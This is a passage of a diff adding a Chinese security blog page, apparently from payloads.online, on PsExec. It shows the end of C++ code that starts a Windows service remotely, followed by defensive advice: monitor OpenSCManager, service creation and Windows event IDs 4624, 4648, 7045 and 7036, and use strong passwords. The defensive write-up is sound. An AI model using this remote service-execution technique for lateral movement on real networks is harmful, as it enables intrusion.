+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    }
+    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;OpenService Success!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+    
+    StartService(hService, NULL, NULL);
+    
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><h2 id="0x08-总结psexec防御">0x08 总结PsExec防御</h2>
+<ol>
+<li>如果内网大量机器使用SMB V2，可从网络协议上进行分析，着重监控<code>OpenSCManager</code></li>
+<li>终端上进行事件监控如：创建服务、创建文件，根据HASH匹配能有效阻绝一部分攻击</li>
+<li>服务器采用强口令，内网通用密码的情况太严重</li>
+<li>在终端上日志着重采集以下事件ID</li>
+</ol>
+<ul>
+<li>事件ID：4624</li>
+<li>事件ID：4648</li>
+<li>事件ID：7045</li>
+<li>事件ID：7036</li>
+</ul>
+<p><strong>我的研究与总结可能不够严谨，欢迎斧正。</strong></p>
+
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+
+
+
+<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
+<script>
+(function(){
+  let plantumlPrefix = "language-plantuml";
+  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
+    let image = document.createElement("IMG");
+    image.loading = 'lazy'; 
+    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
+    code.parentNode.insertBefore(image, code);
+    code.style.display = 'none';
+  });
+})();
+</script>
+
+</body>
+</html>
